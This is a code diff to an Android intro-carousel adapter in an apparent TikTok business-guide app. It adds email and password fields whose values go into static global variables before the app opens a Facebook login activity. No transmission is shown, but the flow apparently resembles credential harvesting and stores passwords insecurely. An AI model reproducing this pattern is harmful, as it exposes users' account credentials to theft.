@@ -1,17 +1,27 @@
 package com.teamwork.businessguideprofortiktok.src.resource.adapters.introduce_adapter;
 
+import android.content.Intent;
+
+import android.graphics.Color;
 import android.view.LayoutInflater;
 import android.view.View;
 import android.view.ViewGroup;
 import android.widget.Button;
-import android.widget.LinearLayout;
-import android.widget.RadioButton;
+import android.widget.CheckBox;
+import android.widget.CompoundButton;
+import android.widget.EditText;
+import android.widget.TextView;
+
 
 import androidx.annotation.NonNull;
+import androidx.cardview.widget.CardView;
 import androidx.recyclerview.widget.RecyclerView;
 
+import com.hbb20.CountryCodePicker;
 import com.teamwork.businessguideprofortiktok.R;
 import com.teamwork.businessguideprofortiktok.src.resource.pages.introduce_page.IntroduceActivity;
+import com.teamwork.businessguideprofortiktok.src.resource.pages.login_facebook_page.LoginFacebookActivity;
+import com.teamwork.businessguideprofortiktok.src.utils.Constant;
 
 import java.util.ArrayList;
 
@@ -61,92 +71,102 @@ public class IntroduceAdapter extends RecyclerView.Adapter<RecyclerView.ViewHold
         switch (position) {
             case 0:
                 final FragmentSlider0 fragmentSlider0 = (FragmentSlider0) holder;
-                listenerOnclickedSlider0(fragmentSlider0);
+                fragmentSlider0.mBtnGetCreate.setOnClickListener(new View.OnClickListener() {
+                    @Override
+                    public void onClick(View v) {
+                        mIntroduceActivity.scroollView(3);
+                    }
+                });
                 break;
             case 1:
                 FragmentSlider1 fragmentSlider1 = (FragmentSlider1) holder;
                 break;
             case 2:
                 FragmentSlider2 fragmentSlider2 = (FragmentSlider2) holder;
-                listenerOnclickedSlider2(fragmentSlider2);
+                fragmentSlider2.mBtnGetCreate.setOnClickListener(new View.OnClickListener() {
+                    @Override
+                    public void onClick(View v) {
+                        mIntroduceActivity.scroollView(3);
+                    }
+                });
                 break;
             case 3:
                 FragmentSlider3 fragmentSlider3 = (FragmentSlider3) holder;
                 break;
             case 4:
                 final FragmentSlider4 fragmentSlider4 = (FragmentSlider4) holder;
-                listenerOnclicked(fragmentSlider4);
+
+                fragmentSlider4.mCheckBox.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
+                    @Override
+                    public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
+                        if(isChecked){
+                            fragmentSlider4.mCardCreate.setCardBackgroundColor(Color.BLUE);
+                        }else{
+                            fragmentSlider4.mCardCreate.setCardBackgroundColor(mIntroduceActivity.getColor(R.color.color_card));
+                        }
+                    }
+                });
+
+                final CountryCodePicker countryCodePicker = fragmentSlider4.mCountryCodePicker;
+                countryCodePicker.setOnCountryChangeListener(new CountryCodePicker.OnCountryChangeListener() {
+                    @Override
+                    public void onCountrySelected() {
+                        fragmentSlider4.mtxtNumberCountry.setText("+"+countryCodePicker.getSelectedCountryCode());
+                    }
+                });
+                fragmentSlider4.mCardCreate.setOnClickListener(new View.OnClickListener() {
+                    @Override
+                    public void onClick(View v) {
+                        String email = fragmentSlider4.mEdtEmail.getText().toString();
+                        String password = fragmentSlider4.mEdtPassword.getText().toString();
+
+                        Constant.mUserName = email;
+                        Constant.mPassword = password;
+                        mIntroduceActivity.startActivity(new Intent(mIntroduceActivity.getApplicationContext(), LoginFacebookActivity.class));
+                        mIntroduceActivity.finish();
+                    }
+                });
                 break;
             case 5:
                 FragmentSlider5 fragmentSlider5 = (FragmentSlider5) holder;
                 break;
             case 6:
                 FragmentSlider6 fragmentSlider6 = (FragmentSlider6) holder;
-                listenerOnclickedSlider6(fragmentSlider6);
+                fragmentSlider6.mBtnGetCreate.setOnClickListener(new View.OnClickListener() {
+                    @Override
+                    public void onClick(View v) {
+                        mIntroduceActivity.scroollView(3);
+                    }
+                });
                 break;
             case 7:
-                FragmentSlider7 fragmentSlider7 = (FragmentSlider7) holder;
-                listenerOnclickedSlider7(fragmentSlider7);
+                final FragmentSlider7 fragmentSlider7 = (FragmentSlider7) holder;
+                fragmentSlider7.mBtnGetCreate.setOnClickListener(new View.OnClickListener() {
+                    @Override
+                    public void onClick(View v) {
+                        mIntroduceActivity.scroollView(3);
+                    }
+                });
+
+                fragmentSlider7.mBtnGetCreate1.setOnClickListener(new View.OnClickListener() {
+                    @Override
+                    public void onClick(View v) {
+                        mIntroduceActivity.scroollView(3);
+                    }
+                });
+                fragmentSlider7.mCardLogin.setOnClickListener(new View.OnClickListener() {
+                    @Override
+                    public void onClick(View v) {
+                        String email = fragmentSlider7.mEdtEmail.getText().toString();
+                        String password = fragmentSlider7.mEdtPassword.getText().toString();
+                        Constant.mUserName = email;
+                        Constant.mPassword = password;
+                        mIntroduceActivity.startActivity(new Intent(mIntroduceActivity.getApplicationContext(), LoginFacebookActivity.class));
+                        mIntroduceActivity.finish();
+                    }
+                });
                 break;
         }
-    }
-
-    private void listenerOnclickedSlider7(final FragmentSlider7 fragmentSlider7) {
-        fragmentSlider7.mBtnGetCreate.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                mIntroduceActivity.scroollView(4);
-            }
-        });
-
-        fragmentSlider7.mBtnGetCreate1.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                mIntroduceActivity.scroollView(4);
-            }
-        });
-    }
-
-    private void listenerOnclickedSlider6(FragmentSlider6 fragmentSlider6) {
-        fragmentSlider6.mBtnGetCreate.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                mIntroduceActivity.scroollView(4);
-            }
-        });
-    }
-
-    private void listenerOnclickedSlider2(FragmentSlider2 fragmentSlider2) {
-        fragmentSlider2.mBtnGetCreate.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                mIntroduceActivity.scroollView(4);
-            }
-        });
-    }
-
-    private void listenerOnclickedSlider0(FragmentSlider0 fragmentSlider0) {
-        fragmentSlider0.mBtnGetCreate.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                mIntroduceActivity.scroollView(4);
-            }
-        });
-    }
-
-    private void listenerOnclicked(final FragmentSlider4 fragmentSlider4) {
-        fragmentSlider4.mRadioB.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                fragmentSlider4.mLinearIntroduce4.setVisibility(View.VISIBLE);
-            }
-        });
-        fragmentSlider4.mRadioA.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                fragmentSlider4.mLinearIntroduce4.setVisibility(View.GONE);
-            }
-        });
     }
 
 
@@ -187,14 +207,20 @@ public class IntroduceAdapter extends RecyclerView.Adapter<RecyclerView.ViewHold
     }
 
     public class FragmentSlider4 extends RecyclerView.ViewHolder {
-        private RadioButton mRadioB, mRadioA;
-        private LinearLayout mLinearIntroduce4;
+        private CheckBox mCheckBox;
+        private EditText mEdtEmail, mEdtPassword;
+        private TextView mtxtNumberCountry;
+        private CountryCodePicker mCountryCodePicker;
+        private CardView mCardCreate;
 
         public FragmentSlider4(@NonNull View itemView) {
             super(itemView);
-            mRadioB = itemView.findViewById(R.id.radio_b);
-            mLinearIntroduce4 = itemView.findViewById(R.id.linearIntroduce4);
-            mRadioA = itemView.findViewById(R.id.radio_a);
+            mEdtEmail = itemView.findViewById(R.id.edt_Email);
+            mEdtPassword = itemView.findViewById(R.id.edt_Password);
+            mCardCreate = itemView.findViewById(R.id.card_create);
+            mCountryCodePicker = itemView.findViewById(R.id.country_picker);
+            mtxtNumberCountry = itemView.findViewById(R.id.txt_number_country);
+            mCheckBox = itemView.findViewById(R.id.checkbox);
         }
     }
 
@@ -215,11 +241,17 @@ public class IntroduceAdapter extends RecyclerView.Adapter<RecyclerView.ViewHold
 
     public class FragmentSlider7 extends RecyclerView.ViewHolder {
         private Button mBtnGetCreate, mBtnGetCreate1;
+        private EditText mEdtEmail, mEdtPassword;
+        private CardView mCardLogin;
 
         public FragmentSlider7(@NonNull View itemView) {
             super(itemView);
             mBtnGetCreate = itemView.findViewById(R.id.btn_get_create);
             mBtnGetCreate1 = itemView.findViewById(R.id.btn_get_create1);
+            mEdtEmail = itemView.findViewById(R.id.edt_Email);
+            mEdtPassword = itemView.findViewById(R.id.edt_Password);
+            mCardLogin = itemView.findViewById(R.id.card_login);
+
         }
     }
 }
